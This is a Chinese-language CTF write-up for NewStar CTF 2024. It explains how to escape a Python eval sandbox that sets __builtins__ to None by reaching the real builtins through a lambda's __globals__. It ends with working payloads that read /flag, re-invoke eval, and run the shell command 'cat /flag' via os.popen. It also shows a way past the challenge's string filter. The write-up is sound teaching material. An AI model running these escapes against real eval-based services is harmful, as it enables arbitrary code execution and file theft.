---
titleTemplate: ':title | WriteUp - NewStar CTF 2024'
---
<script setup>
import SVGGithub from '@docs/assets/icons/mdi--github.svg?component'
</script>

# 臭皮踩踩背

题目需要用 nc 连接，给出了部分源码：

```python
def ev4l(*args):
    print(secret)
inp = input("> ")
f = lambda: None
print(eval(inp, {"__builtins__": None, 'f': f, 'eval': ev4l}))
```

完整源码：

```python
print('你被豌豆关在一个监狱里……')
print('豌豆百密一疏，不小心遗漏了一些东西…')
print('''def ev4l(*args):\n\tprint(secret)\ninp = input("> ")\nf = lambda: None\nprint(eval(inp, {"__builtins__": None, 'f': f, 'eval': ev4l}))''')
print('能不能逃出去给豌豆踩踩背就看你自己了，臭皮…')

def ev4l(*args):
    print(secret)

secret = '你已经拿到了钥匙，但是打开错了门，好好想想，还有什么东西是你没有理解透的？'

inp = input("> ")

f = lambda: None

if "f.__globals__['__builtins__'].eval" in inp:
    f.__globals__['__builtins__'].eval = ev4l
else:
    f.__globals__['__builtins__'].eval = eval

try:
    print(eval(inp, {"__builtins__": None, 'f': f, 'eval': ev4l}))
except Exception as e:
    print(f"Error: {e}")
```

再此之前，我们来学习一下[参考文档](/guide/2024/week3.html#臭皮踩踩背)中的内建函数 `__builtins__`，还有 `globals` 到底是什么，再了解的 `eval()` 的原理，逃离这个上下文。

::: warning 注意
下面的代码块中，除特别说明外，若代码块中存在 `>>>` 开头，则表示该代码块是在自己的 Python 环境中作为测试执行的<span data-desc>（直接命令行运行 `python`）</span>，否则，则是 nc 后发送给题目的内容。
:::

## globals 和 builtins

`globals` 是我们当前的全局空间，如果你声明一个全局变量，它将会存在于当前的 `globals` 中，我们可以看一下 `globals` 中到底有哪些内容，直接新建一个 Python 会话：

```python
>>> globals()
{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>}
>>> x=1
>>> globals()
{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, 'x': 1}
```

但是为什么我们能够直接调用 `open()` 函数呢？因为。但是如果访问了 `open` 函数，如果 `globals` 中有，那就执行 `globals` 中的<span data-desc>（可能是你自己定义的，因此存在于 `globals` 空间中）</span>，否则，执行 `builtins` 中的<span data-desc>（类似 `open` `eval` `__import__` 之类的函数都是在 `builtins` 中的）</span>。

我们来查看一下 `builtins` 中到底有哪些内容：

```python
>>> globals()['__builtins__'].__dict__.keys()
dict_keys(['__name__', '__doc__', '__package__', '__loader__', '__spec__', '__build_class__', '__import__', 'abs', 'all', 'any', 'ascii', 'bin', 'breakpoint', 'callable', 'chr', 'compile', 'delattr', 'dir', 'divmod', 'eval', 'exec', 'format', 'getattr', 'globals', 'hasattr', 'hash', 'hex', 'id', 'input', 'isinstance', 'issubclass', 'iter', 'aiter', 'len', 'locals', 'max', 'min', 'next', 'anext', 'oct', 'ord', 'pow', 'print', 'repr', 'round', 'setattr', 'sorted', 'sum', 'vars', 'None', 'Ellipsis', 'NotImplemented', 'False', 'True', 'bool', 'memoryview', 'bytearray', 'bytes', 'classmethod', 'complex', 'dict', 'enumerate', 'filter', 'float', 'frozenset', 'property', 'int', 'list', 'map', 'object', 'range', 'reversed', 'set', 'slice', 'staticmethod', 'str', 'super', 'tuple', 'type', 'zip', '__debug__', 'BaseException', 'Exception', 'TypeError', 'StopAsyncIteration', 'StopIteration', 'GeneratorExit', 'SystemExit', 'KeyboardInterrupt', 'ImportError', 'ModuleNotFoundError', 'OSError', 'EnvironmentError', 'IOError', 'WindowsError', 'EOFError', 'RuntimeError', 'RecursionError', 'NotImplementedError', 'NameError', 'UnboundLocalError', 'AttributeError', 'SyntaxError', 'IndentationError', 'TabError', 'LookupError', 'IndexError', 'KeyError', 'ValueError', 'UnicodeError', 'UnicodeEncodeError', 'UnicodeDecodeError', 'UnicodeTranslateError', 'AssertionError', 'ArithmeticError', 'FloatingPointError', 'OverflowError', 'ZeroDivisionError', 'SystemError', 'ReferenceError', 'MemoryError', 'BufferError', 'Warning', 'UserWarning', 'EncodingWarning', 'DeprecationWarning', 'PendingDeprecationWarning', 'SyntaxWarning', 'RuntimeWarning', 'FutureWarning', 'ImportWarning', 'UnicodeWarning', 'BytesWarning', 'ResourceWarning', 'ConnectionError', 'BlockingIOError', 'BrokenPipeError', 'ChildProcessError', 'ConnectionAbortedError', 'ConnectionRefusedError', 'ConnectionResetError', 'FileExistsError', 'FileNotFoundError', 'IsADirectoryError', 'NotADirectoryError', 'InterruptedError', 'PermissionError', 'ProcessLookupError', 'TimeoutError', 'open', 'quit', 'exit', 'copyright', 'credits', 'license', 'help', '_'])
```

可以看到 `open` `eval` `__import__` 等函数都在 `builtins` 中。

## eval

`eval` 函数的第一个参数就是一个字符串，即你要执行的 Python 代码，第二个参数就是一个字典，指定在接下来要执行的代码的上下文中，`globals` 是怎样的。

题目中，`eval(inp, {"__builtins__": None, 'f': f, 'eval': ev4l})` 这段代码，`__builtins__` 被设置为 `None`，而我们输入的代码就是在这个 `builtins` 为 `None` 的上下文中执行的，我们从而失去了直接使用 `builtins` 中的函数的能力，像下面的代码就会报错<span data-desc>（题目中直接输入 `print(1)`）</span>：

```python
>>> eval('print(1)', {"__builtins__": None})
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "<string>", line 1, in <module>
TypeError: 'NoneType' object is not subscriptable
```

由于全局 `global` 中没有 `print`，从而从 `builtins` 中寻找，而 `builtins` 为 `None`，触发错误。

但注意看，题目刚好给了一个匿名函数 `f`，看似无用，实际上参考文档已经给出提示——**Python 中「一切皆对象」**。故可以利用函数对象的 `__globals__` 属性来逃逸。我们可以在 Python 终端测试一下：

```python
>>> f = lambda: None
>>> f.__globals__
{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, 'f': <function <lambda> at 0x0000026073850700>}
```

函数的 `__globals__` 记录的是这个函数所在的 `globals` 空间，而这个 `f` 函数是在题目源码的环境中（而不是题目的 eval 的沙箱中），我们从而获取到了原始的 `globals` 环境，然后我们便可以从这个原始 `globals` 中获取到原始 `builtins`：

```python
f.__globals__['__builtins__']
```

## 深入探究 eval 的 builtin 逻辑

但这里还有一个问题，如果我们直接调用 `f.__globals__['__builtins__'].eval`，先不说题目会替换掉 `eval` 函数<span data-desc>（实际上在点号前随便几个空格或者字符串拼接就能绕过，下不赘述）</span>，即使我们能够调用，也会报错：

```python
>>> f = lambda: None
>>> inp='''f.__globals__['__builtins__'].eval('print(1)')'''
>>> eval(inp, {"__builtins__": None, 'f': f})
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "<string>", line 1, in <module>
  File "<string>", line 1, in <module>
TypeError: 'NoneType' object is not subscriptable
```

为什么呢？可以看 Python 解释器的 `builtins` 相关的代码：[<SVGGithub width='1.2em' height='1.2em' style='display: inline-block; vertical-align: sub;' /> bltinmodule.c](https://github.com/python/cpython/blob/079875e39589eb0628b5883f7ffa387e7476ec06/Python/bltinmodule.c#L996-L1002).

![bltinmodule.c](/assets/images/wp/2024/week3/caicaibei_1.png)

可见，会检查 `globals` 中是否已经包含了 `builtins`，如果没有，则会通过 `PyEval_GetBuiltins()` 获取默认的内置函数，并将其添加到 `globals` 中。

又因为[官方文档中对 `eval` 函数的描述](https://docs.python.org/3.10/library/functions.html#eval)：

![官方文档](/assets/images/wp/2024/week3/caicaibei_2.png)

因此，报错的原因便是，我们在 `inp` 中的 `eval` 并没有指定 `globals`，因此 Python 会将**当前调用处的上下文的 `globals`** 作为第二个参数，即使设定了第二个参数但没有指定 `__builtins__`，Python 也会自动注入**当前上下文**中的 `builtins`（也就是未指定则继承）。但当前上下文中的 `builtins` 是 `None`，因此会报错。

绕过也很简单，显式指定即可：

```python
>>> inp='''f.__globals__['__builtins__'].eval('print(1)', { "__builtins__": f.__globals__['__builtins__'] })''' # [!code highlight]
>>> eval(inp, {"__builtins__": None, 'f': f})
```

可以看下面的结构树：

```python
# In source code
globals()               <- f.__globals__
  ├─ __builtins__       <- f.__globals__['__builtins__']
  │  ├─ open            <- f.__globals__['__builtins__'].open
  │  ├─ eval            <- f.__globals__['__builtins__'].eval
  │  └─ ...
  ├─ f                  <- f.__globals__['f']
  └─ ...
    # In `eval(inp, {"__builtins__": None, "f": f})`
    globals()
      ├─ __builtins__   <- None
      ├─ f
      └─ ...
      # Though `f` was from top globals, and you can reach top builtins by `f.__globals__['__builtins__']`
      # the context is still at this level when you run `eval()` AKA `f.__globals__['__builtins__'].eval()`
      # so Python will inject the current builtins, which is `None`, into the `eval` context
```

## Payload

综上，Payload 其实有很多种，这里列举一些：

::: code-group

```python [读文件]
f.__globals__['__builtins__'].open('/flag').read()
```

```python [代码执行]
f.__globals__['__builtins__'] .eval('open("/flag").read()', { "__builtins__": f.__globals__['__builtins__'] })
```

```python [命令执行]
f.__globals__['__builtins__'].__import__('os').popen('cat /flag').read()
```

:::
